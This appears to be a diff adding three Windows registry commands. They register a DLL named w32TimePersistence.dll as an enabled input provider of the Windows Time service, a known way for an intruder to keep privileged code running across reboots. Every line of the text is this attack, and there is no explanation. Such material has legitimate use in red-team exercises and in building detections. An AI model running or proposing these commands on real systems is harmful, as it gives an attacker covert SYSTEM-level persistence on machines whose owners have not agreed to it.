@@ -1,0 +1,3 @@
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\Persistence" /t REG_EXPAND_SZ /v "DllName" /d "%systemroot%\system32\w32TimePersistence.dll" /f
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\Persistence" /t REG_DWORD /v "Enabled" /d "1" /f
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\Persistence" /t REG_DWORD /v "InputProvider" /d "1" /f
